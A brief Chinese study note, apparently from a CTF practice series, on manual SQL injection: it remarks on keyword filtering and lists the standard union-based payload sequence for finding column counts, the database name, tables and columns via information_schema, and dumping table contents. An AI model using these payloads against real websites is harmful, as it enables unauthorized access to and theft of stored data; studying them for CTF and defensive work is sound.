8.sql注入-1–NBOOK

过滤类型我目前遇到有一种是记录型的，关键词会被标记回显注入，另一种属于过滤型会被吸收掉然后回显报错。

像这一题，其实用fuzz由于不属于前者，所以其实不好fuzz，然后我们就掌握常见关键词的绕过方法代入才是最重要的。

过滤贯彻始终，切记角度要广。

1.手注完整的一遍套路为：

判断注入点和类型

union联合注入记得是把where放在所有数据最后，所以最好在做后一个显示位（显示位没有限定）

判断列数：id=1’ order by 1–+

判断库： union select 1,2,database()–+

判断表：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+

判断列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xxx’–+

判断字段：union select 1,2,group_concat(xxx) from xxx(表名)–+
